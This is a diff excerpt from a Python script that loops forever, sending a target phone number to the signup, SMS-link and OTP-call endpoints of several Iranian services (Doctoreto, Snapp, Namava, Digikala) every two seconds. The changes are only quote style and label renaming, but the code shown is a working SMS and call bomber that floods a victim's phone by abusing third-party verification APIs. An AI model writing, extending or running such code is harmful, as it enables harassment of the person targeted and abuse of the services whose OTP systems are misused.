@@ -304,8 +304,8 @@ while True:
     # Doctoreto
     doctoreto_url = 'https://api.doctoreto.com/api/web/patient/v1/accounts/register'
     doctoreto_payload = {
-        "country_id": 205,
-        "mobile": number
+        'country_id': 205,
+        'mobile': number
     }
     doctoreto_req = requests.post(doctoreto_url, json=doctoreto_payload, headers=rhead)
     print('Doctoreto: '+str(doctoreto_req.status_code))
@@ -318,19 +318,19 @@ while True:
 
     # SnappApps
     snappapps_url = 'https://api.snapp.ir/api/v1/sms/link'
-    snappapps_payload = {"phone":"0"+number}
+    snappapps_payload = {'phone':'0'+number}
     snappapps_req = requests.post(snappapps_url, json=snappapps_payload, headers=rhead)
     print('SnappApps: '+str(snappapps_req.status_code))
 
     # Namava
     namava_url = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
-    namava_payload = {"UserName":"+98"+number}
+    namava_payload = {'UserName':'+98'+number}
     namava_req = requests.post(namava_url, json=namava_payload, headers=rhead)
     print('Namava: '+str(namava_req.status_code))
 
     ### Call APIs ###
 
-    # digikalacall
+    # DigikalaCall
     digikalacall_url = 'https://api.digikala.com/v1/user/authenticate/'
     digikalacall_payload = {
         'backUrl': '/',
@@ -338,6 +338,6 @@ while True:
         'otp_call': 'true'
     }
     digikalacall_req = requests.post(digikalacall_url, json=digikalacall_payload, headers=rhead)
-    print('digikalacall: '+str(digikalacall_req.status_code))
+    print('DigikalaCall: '+str(digikalacall_req.status_code))
 
     sleep(2)
